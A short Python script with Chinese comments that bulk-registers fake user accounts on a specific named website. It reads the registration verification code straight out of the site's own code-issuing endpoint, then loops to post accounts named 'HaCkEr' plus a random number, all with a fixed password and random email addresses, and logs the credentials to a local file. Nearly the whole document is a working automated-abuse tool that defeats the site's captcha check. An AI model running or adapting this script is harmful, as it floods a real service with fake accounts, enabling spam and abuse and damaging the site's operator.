import requests
import json
import random

i = int(0)
num = int(input('你想批量注册的用户数量:'))
while i < num:
    headers = {

        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47",

        'cookie':'PHPSESSID=md65imf1d2av4k5497aaqj8jb6'

    }


    #获取验证码

    url_Getcode='https://www.dzzyisp.com/index.php?m=member&c=checklogin&a=get_code&k=Wed%20Oct%2006%202021%2011%3A36%3A01%20GMT%2B0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)40000'    

    resp=requests.get(url=url_Getcode,headers=headers)

    text=resp.text

    jsonObj=json.loads(text)

    code = jsonObj['MSG']['code']
    
    #注册用户信息

    user='HaCkEr'+str(random.randrange(10,1000000))

    passwd='123.com'

    email=str(random.randrange(10,1000000))+'@qq.com'

    data ={
        'modelid':'10',
        'siteid':'1',
        'username':user,

        'password':passwd,

        'pwdconfirm':passwd,
        'email':email,
        'code':code,

        'dosubmit':'',
        'protocol':'1'

    }


    #批量注册

    url_Register='https://www.dzzyisp.com/index.php?m=member&c=index&a=register&siteid=1'

    resp1=requests.post(url_Register,data=data,headers=headers)
    print("username:"+str(user)+" passwd:"+str(passwd))
    
    #记录
    f = open("C:\\Users\\Oringals\\Desktop\\register.txt",'a+')
    f.write(user+'\n'+passwd+'\n')
    i += 1

print('完成批量注册'+str(i)+'条')
f.close()
   
 

    

